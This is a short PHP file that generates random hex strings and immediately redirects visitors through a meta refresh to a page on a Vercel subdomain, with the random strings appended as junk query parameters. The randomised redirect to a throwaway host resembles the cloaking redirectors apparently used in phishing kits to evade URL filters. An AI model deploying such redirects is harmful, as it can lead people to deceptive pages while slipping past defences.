
<?php
$bytes = openssl_random_pseudo_bytes(10);
$rand = bin2hex($bytes);
$bytes2 = openssl_random_pseudo_bytes(10);
$rand2 = bin2hex($bytes2);

echo '<meta http-equiv="Refresh" content="0;URL=https://dorsite-88mys2qnw-ula0709s-projects.vercel.app/indexpaginaprincipal.html?='.$rand.'=?&'.$rand2.'?=">';
?>
